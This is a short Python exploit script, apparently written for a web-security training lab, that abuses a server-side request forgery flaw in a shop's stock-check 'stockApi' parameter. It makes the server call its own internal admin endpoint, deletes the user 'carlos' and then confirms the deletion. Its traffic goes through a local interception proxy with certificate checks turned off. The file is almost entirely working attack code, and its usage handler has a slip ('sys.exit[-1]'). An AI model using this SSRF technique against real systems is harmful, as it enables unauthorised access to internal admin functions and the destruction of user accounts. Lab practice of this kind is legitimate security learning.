
#Check out the full explanation of this code: /Days/day14.md

from typing import Mapping
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': "http://127.0.0.1:8080", 'https': "http://127.0.0.1:8080"}


def delete_user(url):
    payload = 'http://localhost/admin/delete?username=carlos' #since we have to delete the carlos username
    check_stock_path = '/product/stock' 
    params = {'stockApi': payload} #which is in the stock request
    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params)

# Now checking if it our script actually worked or not - which is here deleting the user name carlos 
    payload2 = 'http://localhost/admin'
    params2 = {'stockApi': payload2}
    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params2)
    if "User deleted successfully" in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was Unsuccessful.")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit[-1]

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)



if __name__ == "__main__":
    main()
